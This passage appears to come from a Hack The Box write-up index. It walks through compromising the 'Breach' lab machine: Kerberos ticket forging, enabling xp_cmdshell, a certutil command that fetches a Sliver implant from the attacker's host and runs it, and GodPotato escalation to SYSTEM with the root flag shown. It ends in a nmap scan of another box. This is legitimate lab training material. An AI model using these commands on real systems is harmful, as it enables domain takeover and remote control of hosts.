448123d2dfcabf056ace05258f2d693d261e4380b81a53c392805e68b235ea14f75dadd658b766cc62829d834123a20624c2cd731083019bc3967bbb03874455cc0a7798af7c4b65329be27df0d3497fc1c3386b9c1cf01f4f9f210610c8fe82c9676be0ea048311245ab7a1b953a2f7b14745ccf3a72c08690bbe58278bed055a37a15cbf7afd650846d941f0bf590f9fafa8bd3b8cc9192731643116b3e1026630fb891833586ee59ac42747b69052aefd46c58275a857c2b0630021d922a223e443ea7eaaffa6374123d1e800fdbf97919a898fc38e9244b2af807bb145e670646d02162f052392bd7e5624ffd01dde9f51f28907df02281f979994bd5cb9a8b19574c346a716b0abac13669813c11dbfdd1bbc8640b62f256f62c1214b9d845992dadee03fa5fb7c28ac6a83b5d0f4675f9a80741e25507132a52710d972d887fcd5d0df9a21490e432be1e8f7a069e3ddef21121c7142f8e54cd29399b00c5adeabc:Trustno1\n</code></pre> <p>Credential:</p> <pre><code>svc_mssql:Trustno1\n</code></pre> <p>Get a ccache</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-getTGT breach.vl/svc_mssql:Trustno1\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket in svc_mssql.ccache\n</code></pre> <p>This is a good start.  Lets examine with <code>Bloodhound</code>.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ bloodhound-ce-python -k -no-pass -d breach.vl -u julia.wong -dc breachdc.breach.vl -c all --zip -op bloody\nINFO: BloodHound.py for BloodHound Community Edition\nINFO: Found AD domain: breach.vl\nINFO: Using TGT from cache\nINFO: Found TGT with correct principal in ccache file.\nINFO: Connecting to LDAP server: breachdc.breach.vl\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: breachdc.breach.vl\nINFO: Found 15 users\nINFO: Found 54 groups\nINFO: Found 2 gpos\nINFO: Found 2 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: BREACHDC.breach.vl\nINFO: Done in 00M 26S\nINFO: Compressing output into 20251025015627_bloodhound.zip\n</code></pre> <p>Interestingly, <code>Julia.wong</code> is a member of <code>Staff</code> and <code>Print Operators</code>.</p> <p></p> <p>There is nothing particularly interesting about the <code>Staff</code> group, but <code>Print Operators</code>: https://notes.dollarboysushil.com/windows-privilege-escalation/group-privileges/print-operators </p><pre><code>The **Print Operators** group is a highly privileged group in Windows that grants its members several significant permissions, including:\n\n- `**SeLoadDriverPrivilege**`: Allows members to load and manage system drivers.\n\n- The ability to manage, create, share, and delete printers connected to a Domain Controller.\n\n- The ability to log on locally to a Domain Controller and shut it down.\n</code></pre><p></p> <p>There is also the potential to execute shellcode in the context of <code>NT AUTHORITY\\System</code>, using the <code>Capcom.sys</code> driver.</p> <p>Maybe this is something, maybe it is not.  I might circle back to this. </p> <p>One other thing I saw was that there is a domain admin user, <code>christine.bruce</code>, which has password not required set:</p> <p></p> <p>That is pretty interesting, but not sure how that could work out from here.</p>"},{"location":"writeups/HackTheBox/Machines/Breach/#get-a-shell","title":"Get a shell","text":"<p>Both of my controlled users are guests on the <code>mssql</code> instance</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-mssqlclient breach.vl/julia.wong:Computer1@breachdc.breach.vl -windows-auth\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (BREACH\\Julia.Wong  guest@master)&gt; exit\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-mssqlclient breach.vl/svc_mssql:Trustno1@breachdc.breach.vl -windows-auth\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (BREACH\\svc_mssql  guest@master)&gt; exit\n</code></pre> <p>I do have the credentials for the <code>svc_mssql</code> user, and their SPN is <code>MSSQLSvc/breachdc.breach.vl:1433</code>.  I could forge a silver ticket for that SPN for <code>christine</code>.  Lets do that</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ cat ~/bin/password_to_ntlm_hash.py \n#!/usr/bin/env python3\nimport hashlib\nimport binascii\n\ndef convert_to_ntlm(password):\n    encoded_password = password.encode('utf-16le')\n    md4_hash = hashlib.new('md4', encoded_password).digest()\n    ntlm_hash = binascii.hexlify(md4_hash).decode('utf-8')\n    return ntlm_hash\n\npassword = input(\"Give password:&gt; \")\nntlm_hash = convert_to_ntlm(password)\nprint(f\"Password: {password}\")\nprint(f\"NTLM Hash: {ntlm_hash}\")\n</code></pre> <p>Hash <code>svc_mssqls</code> password using the above script</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ ~/bin/password_to_ntlm_hash.py\nGive password:&gt; Trustno1\nPassword: Trustno1\nNTLM Hash: 69596c7aa1e8daee17f8e78870e25a5c\n</code></pre> <p>Forge a service ticket for <code>christine.bruce</code>, for the <code>MSSQLSvc/</code> SPN.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ impacket-ticketer -domain breach.vl -domain-sid S-1-5-21-2330692793-3312915120-706255856 -spn MSSQLSvc/breachdc.breach.vl:1433 -nthash 69596c7aa1e8daee17f8e78870e25a5c christine.bruce\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for breach.vl/christine.bruce\n[*]     PAC_LOGON_INFO\n[*]     PAC_CLIENT_INFO_TYPE\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Signing/Encrypting final ticket\n[*]     PAC_SERVER_CHECKSUM\n[*]     PAC_PRIVSVR_CHECKSUM\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Saving ticket in christine.bruce.ccache\n</code></pre> <p>My access when connecting to the <code>mssql</code> instance with these credentials is <code>dbo</code></p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ KRB5CCNAME=$(pwd)/christine.bruce.ccache impacket-mssqlclient -k -no-pass breach.vl/christine.bruce@breachdc.breach.vl\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (BREACH\\Administrator  dbo@master)&gt;\n</code></pre> <p>Enable <code>xp_cmdshell</code></p> <pre><code>SQL (BREACH\\Administrator  dbo@master)&gt; enable_xp_cmdshell\nINFO(BREACHDC\\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.\nINFO(BREACHDC\\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.\n</code></pre> <p>Start <code>sliver-server</code>, enabling <code>multiplayer</code>, also stand up an <code>mtls listener</code> on <code>8443</code> with a <code>timeout</code> of <code>240</code>.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ sliver-server\n[*] Loaded 23 aliases from disk\n[*] Loaded 151 extension(s) from disk\n\n    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557     \u2588\u2588\u2557\u2588\u2588\u2557   \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n    \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551     \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\n    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551     \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\n    \u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2551\u255a\u2588\u2588\u2557 \u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\n    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\n    \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\n\nAll hackers gain annihilator\n[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405\n[*] Welcome to the sliver shell, please type 'help' for options\n\n[*] Check for updates with the 'update' command\n\n[server] sliver &gt; multiplayer \n\n[*] Multiplayer mode enabled!\n\n[server] sliver &gt; mtls -t 240 --lport 8443\n\n[*] Starting mTLS listener ...\n\n[*] Successfully started job #3\n\n[server] sliver &gt;\n</code></pre> <p>Generate a new operator profile</p> <pre><code>[server] sliver &gt; new-operator --lhost 10.10.14.204 --save duff --name duff\n\n[*] Generating new client certificate, please wait ... \n[*] Saved new client config to: /home/notroot/htb/machines/breach/duff \n</code></pre> <p>In another shell, import the profile into <code>sliver-client</code>.  Connect.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ sliver-client import duff\n2025/10/25 03:26:23 Saved new client config to: /home/notroot/.sliver-client/configs/duff_10.10.14.204.cfg\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ sliver-client\n? Select a server: duff@10.10.14.204 (a0e0ed1e78716827)\nConnecting to 10.10.14.204:31337 ...\n[*] Loaded 23 aliases from disk\n[*] Loaded 151 extension(s) from disk\n\n.------..------..------..------..------..------.\n|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |\n| :/\\: || :/\\: || (\\/) || :(): || (\\/) || :(): |\n| :\\/: || (__) || :\\/: || ()() || :\\/: || ()() |\n| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|\n`------'`------'`------'`------'`------'`------'\n\nAll hackers gain assist\n[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405\n[*] Welcome to the sliver shell, please type 'help' for options\n\n[*] Check for updates with the 'update' command\n\nsliver &gt;\n</code></pre> <p>Generate an implant</p> <pre><code>sliver &gt; generate -l -G -t 240 -m 10.10.14.204:8443 -a amd64 -o windows -j 60 -s a.exe\n\n[*] Generating new windows/amd64 implant binary\n[!] Symbol obfuscation is disabled\n[*] Build completed in 2s\n[*] Implant saved to /home/notroot/htb/machines/breach/a.exe\n</code></pre> <p>Serve it</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ python3 -m http.server 443\nServing HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ...\n</code></pre> <p>On the <code>mssqlclient</code>, use <code>xp_cmdshell</code> to download the implant to the host</p> <pre><code>SQL (BREACH\\Administrator  dbo@master)&gt; xp_cmdshell cmd.exe /c certutil -urlcache -split -f http://10.10.14.204:443/a.exe  \\windows\\tasks\\a.exe\noutput                                                \n---------------------------------------------------   \n****  Online  ****                                    \n\n  000000  ...                                         \n\n  988a00                                              \n\nCertUtil: -URLCache command completed successfully.   \n\nNULL \n</code></pre> <p>Invoke the implant</p> <pre><code>SQL (BREACH\\Administrator  dbo@master)&gt; xp_cmdshell cmd.exe /c \\windows\\tasks\\a.exe\n</code></pre> <p>The user context is high integrity, with <code>SeImpersonatePrivilege</code>.</p> <pre><code>PS C:\\Windows\\system32&gt; whoami /groups\nwhoami /groups\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                 Type             SID                                                             Attributes                                        \n========================================== ================ =============================================================== ==================================================\nEveryone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group\nCONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group\nNT SERVICE\\MSSQL$SQLEXPRESS                Well-known group S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133 Enabled by default, Enabled group, Group owner    \nLOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group\nAuthentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group\nMandatory Label\\High Mandatory Level       Label            S-1-16-12288                                                                                                      \nPS C:\\Windows\\system32&gt; whoami /priv\nwhoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                               State   \n============================= ========================================= ========\nSeAssignPrimaryTokenPrivilege Replace a process level token             Disabled\nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled\nSeMachineAccountPrivilege     Add workstations to domain                Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled \nSeManageVolumePrivilege       Perform volume maintenance tasks          Enabled \nSeImpersonatePrivilege        Impersonate a client after authentication Enabled \nSeCreateGlobalPrivilege       Create global objects                     Enabled \nSeIncreaseWorkingSetPrivilege Increase a process working set            Disabled\nPS C:\\Windows\\system32&gt; whoami /user\nwhoami /user\n\nUSER INFORMATION\n----------------\n\nUser Name        SID                                          \n================ =============================================\nbreach\\svc_mssql S-1-5-21-2330692793-3312915120-706255856-1115\n</code></pre>"},{"location":"writeups/HackTheBox/Machines/Breach/#escalate","title":"Escalate","text":"<p>Upload <code>GodPotato.exe</code></p> <pre><code>sliver (COLOURFUL_GUILTY) &gt; upload /var/www/html/GodPotato-NET4.exe /windows/tasks/godpotato.exe\n\n[*] Wrote file to C:\\windows\\tasks\\godpotato.exe\n</code></pre> <p>Loosen DACLs around the implant (so that other users, like NT AUTHORITY\\System can read/execute).  This is needed because files written here are by default only permitted read/exec by the user who wrote them, even administrators and SYSTEM are denied by default.</p> <pre><code>$path=\"c:\\windows\\tasks\"; (Get-ChildItem -path $path\\* -Recurse).FullName | % {$Acl = Get-ACL $_; $AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule(\"Everyone\",\"FullControl\",\"none\",\"none\",\"Allow\");$Acl.AddAccessRule($AccessRule);Set-Acl $_ $Acl}\n</code></pre> <p><code>Godpotato</code> for escalation</p> <pre><code>PS C:\\Windows\\system32&gt; cd \\windows\\tasks\ncd \\windows\\tasks\nPS C:\\windows\\tasks&gt; .\\godpotato.exe -cmd \"cmd.exe /c .\\a.exe\"\n.\\godpotato.exe -cmd \"cmd.exe /c .\\a.exe\"\n[*] CombaseModule: 0x140732047294464\n[*] DispatchTable: 0x140732049885048\n[*] UseProtseqFunction: 0x140732049177392\n[*] UseProtseqFunctionParamCount: 6\n[*] HookRPC\n[*] Start PipeServer\n[*] CreateNamedPipe \\\\.\\pipe\\01d890f9-0469-4a71-8628-fee24a4b0d37\\pipe\\epmapper\n[*] Trigger RPCSS\n[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046\n[*] DCOM obj IPID: 00005802-03c8-ffff-60ec-ae3827a25927\n[*] DCOM obj OXID: 0x6a8455b40cabdba3\n[*] DCOM obj OID: 0xa9eaaee4bb2b2694\n[*] DCOM obj Flags: 0x281\n[*] DCOM obj PublicRefs: 0x0\n[*] Marshal Object bytes len: 100\n[*] UnMarshal Object\n[*] Pipe Connected!\n[*] CurrentUser: NT AUTHORITY\\NETWORK SERVICE\n[*] CurrentsImpersonationLevel: Impersonation\n[*] Start Search System Token\n[*] PID : 916 Token:0x628  User: NT AUTHORITY\\SYSTEM ImpersonationLevel: Impersonation\n[*] Find System Token : True\n[*] UnmarshalObject: 0x80070776\n[*] CurrentUser: NT AUTHORITY\\SYSTEM\n[*] process start with pid 3004\n</code></pre> <p>On the new session, I am <code>NT AUTHORITY\\SYSTEM</code>.</p> <pre><code>sliver (COLOURFUL_GUILTY) &gt; info\n\n        Session ID: c80f5dd8-d782-4bbf-abf6-1b18fb9fd2f5\n              Name: COLOURFUL_GUILTY\n          Hostname: BREACHDC\n              UUID: 91753042-9532-69dc-dbc7-e9484b42f13e\n          Username: NT AUTHORITY\\SYSTEM\n               UID: S-1-5-18\n               GID: S-1-5-18\n               PID: 7056\n                OS: windows\n           Version: Server 2016 build 20348 x86_64\n            Locale: en-US\n              Arch: amd64\n         Active C2: mtls://10.10.14.204:8443\n    Remote Address: 10.129.38.236:63285\n         Proxy URL: \nReconnect Interval: 1m0s\n     First Contact: Sat Oct 25 03:51:30 PDT 2025 (17s ago)\n      Last Checkin: Sat Oct 25 03:51:30 PDT 2025 (17s ago)\n\nsliver (COLOURFUL_GUILTY) &gt; getuid\n\nS-1-5-18\n\nsliver (COLOURFUL_GUILTY) &gt; whoami\n\nLogon ID: NT AUTHORITY\\SYSTEM\n[*] Current Token ID: NT AUTHORITY\\SYSTEM\n</code></pre> <p>Flag</p> <pre><code>sliver (COLOURFUL_GUILTY) &gt; cat c:/users/administrator/desktop/root.txt\n\nfc98f418f94f8cdb9a30ef026fe64345\n</code></pre> <p></p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/","title":"Rainbow","text":""},{"location":"writeups/HackTheBox/Machines/Rainbow/#nmap-scan","title":"Nmap scan","text":"<pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb]\n\u2514\u2500$ nmap -A -Pn 10.129.234.171\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 11:40 PDT\nNmap scan report for 10.129.234.171\nHost is up (0.14s latency).\nNot shown: 993 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n21/tcp   open  ftp           Microsoft ftpd\n| ftp-syst: \n|_  SYST: Windows_NT\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| 01-18-22  08:22AM                  258 dev.txt\n| 01-18-22  08:30AM                54784 rainbow.exe\n| 01-16-22  01:34PM                  479 restart.ps1\n|_01-16-22  12:14PM       &lt;DIR&gt;          wwwroot\n80/tcp   open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: IIS Windows Server\n|_http-server-header: Microsoft-IIS/10.0\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: RAINBOW\n|   NetBIOS_Domain_Name: RAINBOW\n|   NetBIOS_Computer_Name: RAINBOW\n|   DNS_Domain_Name: rainbow\n|   DNS_Computer_Name: rainbow\n|   Product_Version: 10.0.17763\n|_  System_Time: 2025-10-25T18:44:06+00:00\n|_ssl-date: 2025-10-25T18:44:45+00:00; +2s from scanner time.\n| ssl-cert: Subject: commonName=rainbow\n| Not valid before: 2025-10-24T18:35:40\n|_Not valid after:  2026-04-25T18:35:40\n8080/tcp open  http-proxy\n|_http-title: Dev Wiki powered by Rainbow Webserver\n| fingerprint-strings: \n|   GetRequest, HTTPOptions: \n|     HTTP/1.1 200 OK\n|     Cache-Control: no-cache, private\n|     Content-Type: text/html\n|     X-Powered-By: Rainbow 0.1\n|     Content-Length: 1478\n|     &lt;!DOCTYPE html&gt;\n|     &lt;html lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\"&gt;\n|     &lt;head&gt;\n|     &lt;meta charset=\"utf-8\" /&gt;\n|     &lt;title&gt;Dev Wiki powered by Rainbow Webserver&lt;/title&gt;\n|     &lt;style&gt; \n|     .rainbow {\n|     font-size: 24pt;\n|     background-image: linear-gradient(to left, violet, indigo, blue, green, yellow, orange, red); -webkit-background-clip: text;\n|     color: transparent;\n|     body {\n|     display: flex;\n|     justify-content: center;\n|     align-items: center;\n|     text-align: center;\n|     min-height: 100vh;\n|     &lt;/style&gt;\n|     &lt;/head&gt;\n|     &lt;body&gt;\n|     &lt;!-- \n|     Under Development, please come back later --&gt;\n|     &lt;pre class=\"rainbow\"&gt;\n|     _.--'_......----........\n|     _,i,,-'' __,,...........___\n|_    ,;-' _.--'' ___,,...\n|_http-open-proxy: Proxy might be redirecting requests\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8080-TCP:V=7.95%I=7%D=10/25%Time=68FD19C3%P=x86_64-pc-linux-gnu%r(G\nSF:etRequest,646,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nCache-Control:\\x20no-cache,\\x2\nSF:0private\\r\\nContent-Type:\\x20text/html\\r\\nX-Powered-By:\\x20Rainbow\\x200\nSF:\\.1\\r\\nContent-Length:\\x201478\\r\\n\\r\\n\\xef\\xbb\\xbf&lt;!DOCTYPE\\x20html&gt;\\n\\\nSF:n&lt;html\\x20lang=\\\"en\\\"\\x20xmlns=\\\"http://www\\.w3\\.org/1999/xhtml\\\"&gt;\\n&lt;he\nSF:ad&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\\"utf-8\\\"\\x20/&gt;\\n\\x20\\x20\\x20\\x20\nSF:&lt;title&gt;Dev\\x20Wiki\\x20powered\\x20by\\x20Rainbow\\x20Webserver&lt;/title&gt;\\n\\x\nSF:20\\x20\\x20\\x20&lt;style&gt;\\x20\\x20\\x20\\x20\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\.rainbow\\x20{\\n\\t\\tfont-size:\\x2024pt;\\n\\t\\tbackground-image:\\x20linea\nSF:r-gradient\\(to\\x20left,\\x20violet,\\x20indigo,\\x20blue,\\x20green,\\x20yel\nSF:low,\\x20orange,\\x20red\\);\\x20\\x20\\x20-webkit-background-clip:\\x20text;\\\nSF:n\\x20\\t\\tcolor:\\x20transparent;\\n\\t}\\n\\tbody\\x20{\\n\\x20\\x20\\t\\tdisplay:\nSF:\\x20flex;\\n\\x20\\x20\\t\\tjustify-content:\\x20center;\\n\\x20\\t\\t\\x20align-i\nSF:tems:\\x20center;\\n\\x20\\x20\\t\\ttext-align:\\x20center;\\n\\x20\\x20\\t\\tmin-h\nSF:eight:\\x20100vh;\\n\\t}\\n\\x20\\x20\\x20\\x20&lt;/style&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n\\x20\\\nSF:x20\\x20\\x20&lt;!--\\x20\\xf0\\x9f\\x8c\\x88\\x20Under\\x20Development,\\x20please\\\nSF:x20come\\x20back\\x20later\\x20--&gt;\\n\\n\\n\\x20\\x20\\x20\\x20\\x20&lt;pre\\x20class=\nSF:\\\"rainbow\\\"&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\.--'_\\.\\.\\.\\.\\.\\.-\nSF:---\\.\\.\\.\\.\\.\\.\\.\\.\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_,i,,-''\\x20__,,\\.\\.\\.\\.\\\nSF:.\\.\\.\\.\\.\\.\\.___\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20,;-'\\x20_\\.--''\\x20\\x20\\x20\\x20___,,\nSF:\\.\\.\\.\")%r(HTTPOptions,646,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nCache-Control:\\x2\nSF:0no-cache,\\x20private\\r\\nContent-Type:\\x20text/html\\r\\nX-Powered-By:\\x2\nSF:0Rainbow\\x200\\.1\\r\\nContent-Length:\\x201478\\r\\n\\r\\n\\xef\\xbb\\xbf&lt;!DOCTYP\nSF:E\\x20html&gt;\\n\\n&lt;html\\x20lang=\\\"en\\\"\\x20xmlns=\\\"http://www\\.w3\\.org/1999/\nSF:xhtml\\\"&gt;\\n&lt;head&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\\"utf-8\\\"\\x20/&gt;\\n\\x2\nSF:0\\x20\\x20\\x20&lt;title&gt;Dev\\x20Wiki\\x20powered\\x20by\\x20Rainbow\\x20Webserve\nSF:r&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;style&gt;\\x20\\x20\\x20\\x20\\n\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\.rainbow\\x20{\\n\\t\\tfont-size:\\x2024pt;\\n\\t\\tbackground-im\nSF:age:\\x20linear-gradient\\(to\\x20left,\\x20violet,\\x20indigo,\\x20blue,\\x20\nSF:green,\\x20yellow,\\x20orange,\\x20red\\);\\x20\\x20\\x20-webkit-background-cl\nSF:ip:\\x20text;\\n\\x20\\t\\tcolor:\\x20transparent;\\n\\t}\\n\\tbody\\x20{\\n\\x20\\x2\nSF:0\\t\\tdisplay:\\x20flex;\\n\\x20\\x20\\t\\tjustify-content:\\x20center;\\n\\x20\\t\nSF:\\t\\x20align-items:\\x20center;\\n\\x20\\x20\\t\\ttext-align:\\x20center;\\n\\x20\nSF:\\x20\\t\\tmin-height:\\x20100vh;\\n\\t}\\n\\x20\\x20\\x20\\x20&lt;/style&gt;\\n&lt;/head&gt;\\n\nSF:&lt;body&gt;\\n\\x20\\x20\\x20\\x20&lt;!--\\x20\\xf0\\x9f\\x8c\\x88\\x20Under\\x20Developmen\nSF:t,\\x20please\\x20come\\x20back\\x20later\\x20--&gt;\\n\\n\\n\\x20\\x20\\x20\\x20\\x20&lt;\nSF:pre\\x20class=\\\"rainbow\\\"&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\.--'_\nSF:\\.\\.\\.\\.\\.\\.----\\.\\.\\.\\.\\.\\.\\.\\.\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_,i,,-''\\x20\nSF:__,,\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.___\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20,;-'\\x20_\\.--''\\x20\\x20\nSF:\\x20\\x20___,,\\.\\.\\.\");\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019|10 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10\nAggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)\nNo exact OS matches for host 